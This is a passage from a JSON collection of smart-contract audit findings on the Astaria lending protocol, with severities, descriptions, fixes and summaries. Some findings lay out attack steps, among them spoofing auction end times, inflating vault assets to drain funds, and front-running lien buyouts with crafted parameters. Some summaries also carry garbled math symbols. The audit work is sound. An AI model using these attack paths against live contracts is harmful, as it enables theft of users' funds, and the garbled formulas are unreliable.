IPublicVault(payee).updateAfterLiquidationPayment(\n                IPublicVault.LiquidationPaymentParams({lienEnd: end})\n            );\n    -     } else {\n    -         IPublicVault(payee).decreaseEpochLienCount(stack[position].end);\n    -     }\n    }\n    emit Payment(lienId, payment);\n    return payment;\n}\n```\n\n## Additional Notes:\nOther issues related to `_paymentAH()` include:\n\n- Avoid shadowing variables.\n- Comment or remove unused function parameters.\n\n**Astaria:** Fixed in PR 201.  \n**Spearbit:** Verified.",
      "summary": "\nThis bug report is about the function _paymentAH() in the LienToken.sol file. The function has several vulnerabilities, including that the stack is a memory parameter and updates made to stack are not applied back to the corresponding storage variable. Additionally, there is no need to update stack[position] as it is deleted later and decreaseEpochLienCount() is always passed 0 as stack[position] is already deleted. The if/else block can be merged and updateAfterLiquidationPayment() expects msg.sender to be LIEN_TOKEN. The recommendation is to apply the given diff to the function and note other issues related to _paymentAH() such as avoiding shadowing variables and commenting or removing unused function parameters. The bug was fixed in PR 201 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7293",
      "title": "_removeStackPosition() always reverts",
      "impact": "HIGH",
      "content": "## Security Report\n\n## Severity\n**High Risk**\n\n## Context\n`LienToken.sol#L823-L828`\n\n## Description\nThe function `removeStackPosition()` always reverts since it calls the stack array for an index beyond its length:\n\n```solidity\nfor (i; i < length; ) {\nunchecked {\nnewStack[i] = stack[i + 1];\n++i;\n}\n}\n```\n\nNotice that for `i == length - 1`, `stack[length]` is called. This reverts since length is the length of the stack array.\n\nAdditionally, the intention is to delete the element from the stack at `indexPosition` and shift left the elements appearing after this index. However, an additional increment to the loop index `i` results in `newStack[position]` being empty, and the shift of other elements doesn't happen.\n\n## Recommendation\nApply the following diff to `LienToken.sol#L823-L831`:\n\n```diff\n- unchecked {\n- ++i;\n- }\n- for (i; i < length; ) {\n+ for (i; i < length - 1; ) {\nunchecked {\nnewStack[i] = stack[i + 1];\n++i;\n}\n}\n```\n\n## Note\nThis issue has to be considered in conjunction with the following issue:\n- `makePayment` doesn't properly update stack, so most payments don't pay off debt.\n\n### Astaria\nFixed in PRs 202 and 265.\n\n### Spearbit\nVerified.",
      "summary": "\nThis bug report is about the function removeStackPosition() in the LienToken.sol file. It has a high risk severity. The problem is that the function calls for an index beyond its length, which causes it to always revert. Additionally, the intention of the function is to delete the element from the stack at the given index position and shift the other elements to the left, however, the loop index is incremented which results in newStack[position] being empty and the shift of other elements not happening.\n\nThe recommendation is to apply a diff to the code to fix the issue. The diff removes the unchecked statement and changes the loop index to length-1 instead of length. The issue should also be considered in conjunction with another issue that makePayment doesn't properly update the stack, which causes most payments not to pay off debt. This issue has been fixed in Pull Requests 202 and 265 and has been verified.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Broken Loop"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7292",
      "title": "makePayment doesn't properly update stack, so most payments don't pay off debt",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\nLienToken.sol#615-635\n\n## Description\nAs we loop through individual payments in `_makePayment`, each is called with:\n\n```solidity\n(newStack, spent) = _payment(\n    s,\n    stack,\n    uint8(i),\n    totalCapitalAvailable,\n    address(msg.sender)\n);\n```\n\nThis call returns the updated stack as `newStack` but then uses the function argument `stack` again in the next iteration of the loop. The `newStack` value is unused until the final iterate, when it is passed along to `_updateCollateralStateHash()`. This means that the new state hash will be the original state with only the final loan repaid, even though all other loans have actually had payments made against them.\n\n## Recommendation\n```solidity\nuint256 n = stack.length;\nnewStack = stack;\nfor (uint256 i; i < n; ) {\n    (newStack, spent) = _payment(\n        s,\n        - stack,\n        newStack,\n        uint8(i),\n        totalCapitalAvailable,\n        address(msg.sender)\n    );\n```\n\nThis fixes the issue above, but the solution must also take into account the fix for the loop within `_payment` outlined here in Issue 134. If you follow the suggestion in that issue, then this function should return an extra value (`elementRemoved`) and use that to dictate whether the loop iterates forward, or remains at the same index for the next run.\n\nThe final result should look like:\n\n```solidity\nfunction _makePayment(\n    LienStorage storage s,\n    Stack[] calldata stack,\n    uint256 totalCapitalAvailable\n) internal returns (Stack[] memory newStack, uint256 spent) {\n    newStack = stack;\n    bool elementRemoved = false;\n    for (uint256 i; i < newStack.length; ) {\n        (newStack, spent, elementRemoved) = _payment(\n            s,\n            newStack,\n            uint8(i),\n            totalCapitalAvailable,\n            address(msg.sender)\n        );\n        totalCapitalAvailable -= spent;\n        // if stack is updated, we need to stay at the current index\n        // to process the new element on the same index.\n        if (!elementRemoved) unchecked { ++i; }\n        _updateCollateralStateHash(s, stack[0].lien.collateralId, newStack);\n    }\n}\n```\n\nAstaria: Checked if `newStack` changed length instead of returning an `elementRemoved` bool because of stack too deep error.",
      "summary": "\nThis bug report is about the LienToken.sol#615-635 code. The bug occurs when a loop is used to make payments. The loop calls the _payment() function with the stack argument and returns the updated stack as newStack. However, the newStack value is not used until the final loop iteration, when it is passed along to the _updateCollateralStateHash() function. This means that the new state hash will be the original state with only the final loan repaid, even though all other loans have had payments made against them.\n\nThe recommended solution is to update the loop so that it uses the newStack value instead of the stack argument. Additionally, the _payment() function should return an extra value (elementRemoved) and use that to dictate whether the loop iterates forward or remains at the same index for the next run. Finally, the code should check if newStack changed length instead of returning an elementRemoved bool because of stack too deep error.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7291",
      "title": "Typed structured data hash used for signing commitments is calculated incorrectly",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- `VaultImplementation.sol#L150-L151`\n- `VaultImplementation.sol#L172-L176`\n- `IVaultImplementation.sol#L41`\n\n## Description\nSince  \n`STRATEGY_TYPEHASH == keccak256(\"StrategyDetails(uint256 nonce,uint256 deadline,bytes32 root)\")`  \nThe hash calculated in `_encodeStrategyData` is incorrect according to EIP-712. `s.strategistNonce` is of type `uint32` and the nonce type used in the type hash is `uint256`.\n\nAlso, the struct name used in the typehash collides with the `StrategyDetails` struct name defined as:\n```solidity\nstruct StrategyDetails {\n    uint8 version;\n    uint256 deadline;\n    address vault;\n}\n```\n\n## Recommendation\nWe suggest the following:\n1. Update the `STRATEGY_TYPEHASH` to reflect the correct type `uint32` for the nonce.\n2. Keep the `STRATEGY_TYPEHASH` using the non-inlined version below since the compiler would inline the value off-chain:\n   ```solidity\n   bytes32 public constant STRATEGY_TYPEHASH = keccak256(\"StrategyDetails(uint32 nonce,uint256 deadline,bytes32 root)\");\n   ```\n3. To avoid name collision for the two structs, rename one of the `StrategyDetails` (even though one is not defined directly).",
      "summary": "\nThis bug report concerns the VaultImplementation.sol and IVaultImplementation.sol files. It has been identified that the STRATEGY_TYPEHASH is incorrect according to EIP-712. This is due to the fact that the s.strategistNonce type is a uint32, but the type used in the type hash is a uint256. Additionally, the struct name used in the type hash collides with the StrategyDetails struct name which is defined as a uint8 version, uint256 deadline, and an address vault. \n\nThe recommendation is to update the STRATEGY_TYPEHASH to reflect the correct type uint32 for thenonce. It is also suggested to keep the STRATEGY_TYPEHASH using the non-inlined version and to avoid name collision for the two structs, one should be renamed.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Type casting"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7290",
      "title": "Incorrect auction end validation in liquidatorNFTClaim()",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n`CollateralToken.sol#L119`\n\n## Description\nThe function `liquidatorNFTClaim()` includes a check to determine if a Seaport auction has ended:\n\n```solidity\nif (block.timestamp < params.endTime) {\n    // auction hasn't ended yet\n    revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n}\n```\n\nIn this scenario, `params` is completely controlled by users. To bypass this check, the caller can set `params.endTime` to a value less than `block.timestamp`. \n\nA possible exploit scenario occurs when `AstariaRouter.liquidate()` is called to list the underlying asset on Seaport, which also sets the liquidator address. Consequently, anyone can call `liquidatorNFTClaim()` to transfer the underlying asset to the liquidator by setting `params.endTime < block.timestamp`.\n\n## Recommendation\nThe parameter passed to `liquidatorNFTClaim()` should be validated against the parameters created for the Seaport auction. To achieve this:\n\n- Update the `collateralIdToAuction` mapping, which currently maps `collateralId` to a boolean value indicating an active auction, to instead map from `collateralId` to the Seaport order hash.\n- All usages of `collateralIdToAuction` should be updated. For instance, `isValidOrder()` and `isValidOrderIncludingExtraData()` should be modified as follows:\n\n```solidity\nreturn\n    s.collateralIdToAuction[uint256(zoneHash)] == orderHash\n        ? ZoneInterface.isValidOrder.selector\n        : bytes4(0xffffffff);\n```\n\n- The `liquidatorNFTClaim()` function should verify that the hash of `params` matches the value stored in the `collateralIdToAuction` mapping. This validation ensures that `params.endTime` is not spoofed.\n\n## Astaria\nFixed in PR 210.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is about a possible exploit scenario in the CollateralToken.sol file at line 119. The exploit occurs when a user calls the liquidatorNFTClaim() function and sets the params.endTime to be less than the block.timestamp. This allows them to transfer the underlying asset to the liquidator. To fix this issue, the parameter passed to liquidatorNFTClaim() needs to be validated against the parameters created for the Seaport auction. This can be done by updating the collateralIdToAuction mapping so it maps from collateralId to Seaport order hash, and updating usages of collateralIdToAuction to include a check for the order hash. Additionally, liquidatorNFTClaim() should verify that the hash of params matches the value stored in the collateralIdToAuction mapping, to validate that params.endTime is not spoofed. Astaria has already fixed the issue in PR 210, and Spearbit has verified the fix.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7289",
      "title": "settleAuction() doesn't check if the auction was successful",
      "impact": "HIGH",
      "content": "## Security Risk Report\n\n## Severity\n**High Risk**\n\n## Context\n`CollateralToken.sol#L600`\n\n## Description\nThe `settleAuction()` function is a privileged functionality called by `LienToken.payDebtViaClearingHouse()`. It is intended to be called on a successful auction, but it lacks verification to ensure this is the case. \n\nAnyone can create a fake Seaport order with one of its considerations set as the `CollateralToken`, as described in Issue 93. Another potential issue arises if the Seaport orders can be \"Restricted\" in the future. In that scenario, an authorized entity could force the execution of `settleAuction()` on `CollateralToken`, and when Seaport tries to call back on the zone to validate, it would likely fail.\n\n## Recommendation\nThe following validations can be performed:\n\n- `CollateralToken` doesn't own the underlying NFT.\n- `collateralIdToAuction[collateralId]` is active.\n\nBy implementing these checks, `settleAuction()` can only be called upon the successful completion of the Seaport auction created by the Astaria protocol.",
      "summary": "\nThis bug report is about the function settleAuction() in CollateralToken.sol#L600. This function is a privileged functionality called by LienToken.payDebtViaClearingHouse(), and is intended to be called on a successful auction. However, it does not verify whether the auction was successful or not, which can be exploited by creating a fake Seaport order with one of its considerations set as the CollateralToken. Another potential issue is if the Seaport orders can be \"Restricted\" in future, then an authorized entity can force settleAuction on CollateralToken, and when SeaPort tries to call back on the zone to validate it would fail. \n\nTo fix this issue, the following validations can be performed: CollateralToken doesn't own the underlying NFT, and collateralIdToAuction[collateralId] is active. This way, settleAuction() can only be called on the success of the Seaport auction created by Astaria protocol.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Auction"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7288",
      "title": "setPayee doesn't update y intercept or slope, allowing vault owner to steal all funds",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- LienToken.sol#L868-878\n- LienToken.sol#L165-173\n\n## Description\nWhen `setPayee()` is called, the payment for the lien is no longer expected to go to the vault. However, this change doesn't impact the vault's `y-intercept` or `slope`, which are used to calculate the vault's `totalAssets()`. \n\nThis can be used maliciously by a vault owner to artificially increase their `totalAssets()` to any arbitrary amount:\n1. Create a lien from the vault.\n2. Set `Payee` to a non-vault address.\n3. Buyout the lien from another vault (this will cause the other vault's `y-int` and `slope` to increase, but will not impact the `y-int` and `slope` of the original vault because it'll fail the check on L165 that payee is a public vault).\n4. Repeat the process again going the other way, and repeat the full cycle until both vaults have the desired `totalAssets()`.\n\nFor an existing vault, a vault owner can withdraw a small amount of assets each epoch. If, in any epoch, they are one of the only users withdrawing funds, they can perform this attack immediately before the epoch is processed. The result is that the withdrawal shares will be multiplied by `totalAssets() / totalShares()` to get the withdrawal rate, which can be made artificially high enough to wipe out the entire vault.\n\n## Recommendation\nAdjust the `y-intercept` and `slope` of the old payee and the new payee immediately upon the payee being set.\n\n## Astaria\nWe're thinking of removing the ability for the owner to change the payee altogether. There's no clear benefit to having this in the first place, since the payee would have no guarantees on receiving funds since we reset payee on LienToken transfers. We can just lock `setPayee()` to only be callable by a `WithdrawProxy` (if it needs auction funds), which is the primary use case anyway.\n\n## Spearbit\nConfirmed, removing the `setPayee` function in the following PR PR 205 solves the issue.",
      "summary": "\nThis bug report details a high risk issue in LienToken.sol. When setPayee() is called, the payment for the lien is no longer expected to go to the vault. This can be used maliciously by a vault owner to artificially increase their totalAssets(), allowing them to withdraw a much larger amount of assets than they should be able to. It is recommended to adjust the y-intercept and slope of the old payee and the new payee immediately upon the payee being set. Alternatively, Astaria suggests removing the ability for the owner to change the payee altogether, as this would prevent the issue. Spearbit has confirmed that removing the setPayee function in the PR 205 solves the issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7287",
      "title": "VaultImplementation.buyoutLien does not update the new public vault's parameters and does not transfer assets between the vault and the borrower",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context:\n- VaultImplementation.sol#L305\n- LienToken.sol#L102\n- LienToken.sol#L116\n- LienToken.sol#L165-L174\n\n## Description:\n`VaultImplementation.buyoutLien` does not update the accounting for the vault (if it's public). The `slope`, `yIntercept`, and `epochData[...].liensOpenForEpoch` (for the new lien's end epoch) are not updated. They are updated for the payee of the swapped-out lien if the payee is a public vault by calling `handleBuyoutLien`. Also, the buyout amount is paid out by the vault itself. The difference between the new lien amount and the buyout amount is not worked out between the `msg.sender` and the new vault.\n\n## Recommendation:\n1. If the vault that `VaultImplementation.buyoutLien` endpoint was called into is a public vault, make sure to update its `slope`, `yIntercept`, and `epochData[...].liensOpenForEpoch` (for the new lien's end epoch) when the new lien is created.\n2. The difference between the new lien amount and the buyout amount is not worked out between the `msg.sender` that called `VaultImplementation.buyoutLien` and the vault. If the buyout amount is higher than the new lien amount, we need to make sure the `msg.sender` also transfers some assets (wETH) to the vault. And the other way around, if the new lien amount is higher than the buyout amount, the vault needs to transfer some assets (wETH) to the borrower / `msg.sender`.",
      "summary": "\nThis bug report is about an issue with the transfer of assets between a vault and a borrower. The severity of this bug is rated as High Risk. The bug is found in the source code of VaultImplementation.sol#L305, LienToken.sol#L102, LienToken.sol#L116 and LienToken.sol#L165-L174. \n\nThe issue is that when VaultImplementation.buyoutLien is called, the accounting for the vault is not updated. This includes the slope, yIntercept and s.epochData[...].liensOpenForEpoch for the new lien's end epoch. The buyout amount is also paid out by the vault itself, and the difference between the new lien amount and the buyout amount is not worked out between the msg.sender and the new vault.\n\nThe recommendation for this bug is to update the slope, yIntercept and s.epochData[...].liensOpenForEpoch for the new lien's end epoch if the vault that VaultImplementation.buyoutLien is called into is a public vault. Additionally, the difference between the new lien amount and the buyout amount must be worked out between the msg.sender that called VaultImplementation.buyoutLien and the vault. If the buyout amount is higher than the new lien amount, the msg.sender also needs to transfer some assets (wETH) to the vault. If the new lien amount is higher than the buyout amount, the vault needs to transfer some assets (wETH) to the borrower/msg.sender.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state",
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7286",
      "title": "VaultImplementation.buyoutLien can be DoSed by calls to LienToken.buyoutLien",
      "impact": "HIGH",
      "content": "## Vulnerability Report\n\n## Severity: High Risk\n\n### Context\n- LienToken.sol#L102\n- LienToken.sol#L121\n- VaultImplementation.sol#L305\n\n### Description\nAnyone can call into `LienToken.buyoutLien` and provide params of the type `LienActionBuyout`:  \n`params.incoming` is not used, so for example, vault signatures or strategy validation is skipped. There are a few checks for `params.encumber`.\n\nLet's define the following variables:\n\n| Parameter | Value |\n|-----------|-------|\n| i         | params.position |\n| kj        | params.encumber.stack[j].point.position |\n| tj        | params.encumber.stack[j].point.last |\n| ej        | params.encumber.stack[j].point.end |\n| e0       | itnow+D0 |\n| i         | lj params.encumber.stack[j].point.lienId |\n| l0       | ih(N0 i,V0 i,S0 i,c0 i, (A0max i,r0 i,D0 i,P0 i,L0 i)) where h is the keccak256 of the encoding |\n| rj        | params.encumber.stack[j].lien.details.rate : old rate |\n| r0       | params.encumber.lien.details.rate : new rate |\n| c         | params.encumber.collateralId |\n\n| Parameter | Value |\n|-----------|-------|\n| cj        | params.encumber.stack[j].lien.collateralId |\n| c0       | params.encumber.lien.collateralId |\n| Aj        | params.encumber.stack[j].point.amount |\n| A0       | params.encumber.amount |\n| Amax     | params.encumber.stack[j].lien.details.maxAmount |\n| A0max    | params.encumber.lien.details.maxAmount |\n| R         | params.encumber.receiver |\n| Nj        | params.encumber.stack[j].lien.token |\n| N0       | params.encumber.lien.token |\n| Vj        | params.encumber.stack[j].lien.vault |\n| V0       | params.encumber.lien.vault |\n| Sj        | params.encumber.stack[j].lien.strategyRoot |\n| S0       | params.encumber.lien.strategyRoot |\n| Dj        | params.encumber.stack[j].lien.details.duration |\n| D0       | params.encumber.lien.details.duration |\n| Pj        | params.encumber.stack[j].lien.details.maxPotentialDebt |\n| P0       | params.encumber.lien.details.maxPotentialDebt |\n| Lj        | params.encumber.stack[j].lien.details.liquidationInitialAsk |\n| L0       | params.encumber.lien.details.liquidationInitialAsk |\n\n| Parameter | Value |\n|-----------|-------|\n| Imin      | AstariaRouter.s.minInterestBPS |\n| Dmin      | AstariaRouter.s.minDurationIncrease |\n| tnow      | block.timestamp |\n| bi        | buyout |\n| o         | _getOwed(params.encumber.stack[params.position], block.timestamp) |\n| oj        | _getOwed(params.encumber.stack[j], params.encumber.stack[j].point.end) |\n| n         | params.encumber.stack.length |\n| O         | o0 + o1 + ... + on -1_getMaxPotentialDebtForCollateral(params.encumber.stack) |\n| sj        | params.encumber.stack[j] |\n| s0        | inewStack |\n\n### Checks and Modifications\nLet's go over the checks and modifications that `buyoutLien` does:\n\n1. `validateStack` is called to make sure that the hash of `params.encumber.stack` matches with `s.collateralStateHash` value of `c`. This is not important and can be bypassed by the exploit even after the fix for Issue 106.\n2. `_createLien` is called next which does the following checks:  \n   2.1. `c` is not up for auction.  \n   2.2. We haven't reached max number of liens, currently set to 5.  \n   2.3. `L0 i * A0 i > 0`  \n   2.4. If `params.encumber.stack` is not empty then `c0 i = c0`.  \n   2.5. We `_mint` a new lien for `R` with id equal to `h(N0 i, V0 i, S0 i, c0 i, (A0max i, r0 i, D0 i, P0 i, L0 i))` where `h` is the hashing mechanism of encoding and then taking the keccak256.  \n   2.6. The new stack slot and the new lien id are returned.\n3. `isValidRefinance` is called which performs the following checks:  \n   3.1. Checks `c0 i = c0`.  \n   3.2. Checks either  \n   `(r0 i < r i - Imin) ^ (e0 i ≥ e i)`  \n   or  \n   `(r0 i ≥ r i) ^ (e0 i ≥ e i + Dmin)`  \n4. Checks where `c0 i` is in auction by checking `s.collateralStateHash`'s value.\n5. Check `O ≤ P0 i`.\n6. Check `A0max i ≥ o`.\n7. Send `wETH` through `TRANSFER_PROXY` from `msg.sender` to `payee` of `li` with the amount of `bi`.\n8. If `payee` of `li` is a public vault, do some bookkeeping by calling `handleBuyoutLien`.\n9. Call `_replaceStackAtPositionWithNewLien` to:\n   - 9.1. Replace `si` with `s0 i` in `params.encumber.stack`.\n   - 9.2. `_burn li`.\n   - 9.3. Delete `s.lienMeta` of `li`.\n\n### Important Checks\nSo in a nutshell, the important checks are:\n- `c`, `c i` are not in auction (not important for the exploit)\n- `c0 i = c0`\n- `n` is less than or equal to the max number of allowed liens (5 currently) (not important for the exploit)\n- `L0 i ≥ A0 i` and `L0 i > 0`\n- `O ≤ P0 i`\n- `A0max i ≥ o`\n- `(r0 i < r i - Imin) ^ (e0 i ≥ e i)`  \n   or  \n   `(r0 i ≥ r i) ^ (e0 i ≥ e i + Dmin)`\n\n### Exploit\nAn attacker can DoS the `VaultImplementation.buyoutLien` as follows:\n\n1. A vault decides to buy out a collateral's lien to offer better terms and so signs a commitment, and someone on behalf of the vault calls `VaultImplementation.buyoutLien`, which if executed would call `LienToken.buyoutLien` with the following parameters:\n   ```javascript\n   LienActionBuyout({\n       incoming: incomingTerms,\n       position: position,\n       encumber: ILienToken.LienActionEncumber({\n           collateralId: collateralId,\n           amount: incomingTerms.lienRequest.amount,\n           receiver: recipient(),\n           lien: ROUTER().validateCommitment({\n               commitment: incomingTerms,\n               timeToSecondEpochEnd: _timeToSecondEndIfPublic()\n           }),\n           stack: stack\n       })\n   })\n   ```\n\n2. The attacker frontruns the call from step 1 and instead provides the following modified parameters to `LienToken.buyoutLien`:\n   ```javascript\n   LienActionBuyout({\n       incoming: incomingTerms, // not important, since it is not used and can be zeroed-out to save tx gas\n       position: position,\n       encumber: ILienToken.LienActionEncumber({\n           collateralId: collateralId,\n           amount: incomingTerms.lienRequest.amount,\n           receiver: msg.sender, // address of the attacker\n           lien: ILienToken.Lien({ // note that the lien here would have the same fields as the original message by the vault rep\n               token: address(s.WETH),\n               vault: incomingTerms.lienRequest.strategy.vault, // address of the vault offering a better term\n               strategyRoot: incomingTerms.lienRequest.merkle.root,\n               collateralId: collateralId,\n               details: details // see below\n           }),\n           stack: stack\n       })\n   })\n   ```\n\nWhere `details` provided by the attacker can be calculated using the following snippet:\n```javascript\nuint8 nlrType = uint8(_sliceUint(commitment.lienRequest.nlrDetails, 0));\n(bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator(\n   s.strategyValidators[nlrType]\n).validateAndParse(\n   commitment.lienRequest,\n   s.COLLATERAL_TOKEN.ownerOf(\n       commitment.tokenContract.computeId(commitment.tokenId)\n   ),\n   commitment.tokenContract,\n   commitment.tokenId\n);\n```\n\nThe result is that:\n- The new `LienId` that was supposed to be `_mint`ed for the `recipient()` of the vault gets minted for the attacker.\n- The call to `VaultImplementation.buyoutLien` would fail since the new `LienId` is already minted, and so the vault would not be able to receive the interests it had anticipated.\n- When there is a payment or Seaport auction settlement, the attacker would receive the funds instead.\n- The attacker can introduce a malicious contract into the protocol that would be `LienToken.ownerOf(newLienId)` without needing to register for a vault.\n\nTo execute this attack, the attacker would need to spend the buyout amount of assets. Also, the attacker does not necessarily need to front-run a transaction to buyout a lien; they can pick their own hand-crafted parameters that would satisfy the conditions in the analysis above to introduce themselves in the protocol.\n\n### Recommendation\nThere are multiple ways to mitigate this issue:\n1. We can restrict the `LienToken.buyoutLien` endpoint to be only called by the registered vaults in `AstariaRouter`.\n2. In `LienToken.buyoutLien`, use `params.incoming` to validate the signatures and lien details.\n\nThe above 2 solutions would prevent an attacker from introducing/minting a new lien id using parameters from a different vault without themselves registering a vault.\n\n**Spearbit:** This is resolved in the following commit by restricting the `buyoutLien` of the `LienToken` to only valid/registered vaults: commit 24da50.",
      "summary": "\nA bug report has been submitted regarding the LienToken.sol and VaultImplementation.sol smart contracts. The bug affects the buyoutLien function in the LienToken.sol contract, which can be exploited to DoS the VaultImplementation.buyoutLien. Anyone can call into the LienToken.buyoutLien and provide parameters of the type LienActionBuyout, with params.incoming not being used. This means that vault signatures or strategy validation is skipped. \n\nThe attacker can frontrun the call from the vault and instead provide modified parameters to the LienToken.buyoutLien. The attacker needs to provide the same fields as the original message by the vault rep, but with the receiver being the attacker. The attacker also needs to provide details of the lien, which can be calculated by using the IStrategyValidator. \n\nThe result is that the newLienId that was supposed to be minted for the ‘recipient()‘ of the vault, gets minted for the attacker. When there is a payment or Seaport auction settlement, the attacker would receive the funds instead. The attacker can intorduces a malicous contract into the protocol that would be LienToken.ownerOf(newLienId) without needing to register for a vault. \n\nTo mitigate this issue, the LienToken.buyoutLien endpoint can be restricted to be only called by the registered vaults in AstariaRouter, and use params.incoming to validate the signatures and lien details. This would prevent an attacker introducing/minting a new lien id using parameters from a different vault without themselves registering a vault. The issue has been resolved in the commit 24da50.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "DOS",
        "Business Logic",
        "Access Control"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7285",
      "title": "Inequalities involving liquidationInitialAsk andpotentialDebt can be broken when buyoutLien is called",
      "impact": "HIGH",
      "content": "## High Risk Security Issue\n\n## Severity\nHigh Risk\n\n## Context\n- `LienToken.sol#L102`\n- `VaultImplementation.sol#L305`\n- `LienToken.sol#L377-L378`\n- `LienToken.sol#L427`\n- `AstariaRouter.sol#L542`\n\n## Description\nWhen we commit to a new lien, the following gets checked to be true for all \\( j=0, 1, 2, \\ldots, n-1 \\):\n\n\\[\no_{new} + o_j + L_j\n\\]\n\nwhere:\n\n| Parameter                         | Description                                                 |\n|-----------------------------------|-------------------------------------------------------------|\n| \\( o_i \\)                         | `_getOwed(newStack[i], newStack[i].point.end)`            |\n| \\( o_{new} \\)                    | `_getOwed(newSlot, newSlot.point.end)`                     |\n| \\( n \\)                           | `stack.length`                                             |\n| \\( L_i \\)                        | `newStack[i].lien.details.liquidationInitialAsk`          |\n| \\( L_0 \\)                         | `kparams.encumber.lien.details.liquidationInitialAsk`      |\n| \\( A_0 \\)                         | `kparams.position`                                         |\n| \\( kparams.encumber.amount \\)    |                                                           |\n\nIn general, we should have:\n\n\\[\no_1 + o_j + L_j\n\\]\n\nBut when an old lien is replaced with a new one, we only perform the following checks for \\( L_{0k} \\):\n\n\\[\nL_{0k} < A_{0k} \\quad \\text{and} \\quad L_{0k} > 0\n\\]\n\nThus, we can introduce:\n\n- \\( L_{0k} \\geq L_{kor} \\)\n- \\( o_{0k} \\leq o_k \\) (by pushing the lien duration)\n\nThis would break the inequality regarding \\( o_i \\) and \\( L_i \\).\n\nIf the inequality is broken, for example, if we buy out the first lien in the stack, then if the lien expires and goes into a Seaport auction, the auction's starting price \\( L_0 \\) would not be able to cover all the potential debts even at the beginning of the auction.\n\n## Recommendation\nWhen `buyoutLien` is called, we need to loop over \\( j \\) and check the inequalities again:\n\n\\[\no_1 + o_j + L_j\n\\]",
      "summary": "\nThe bug report is about a vulnerability in the LienToken.sol, VaultImplementation.sol, AstariaRouter.sol contracts. When a new lien is committed, it should be checked that the following inequality is true for all j 2 0, \u0001 \u0001 \u0001,n -1: onew+on -1+ \u0001 \u0001 \u0001+oj \u0014Lj. However, when an old lien is replaced with a new one, only the inequality for L0k is checked: L0k \u0015A0k ^L0k >0. This could lead to a situation where the auction's starting price L0would not be able to cover all the potential debts even at the beginning of the auction. The recommendation is to loop over jand check the inequalities again: \u0001 \u0001 \u0001+oj+1+oj \u0014Lj.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
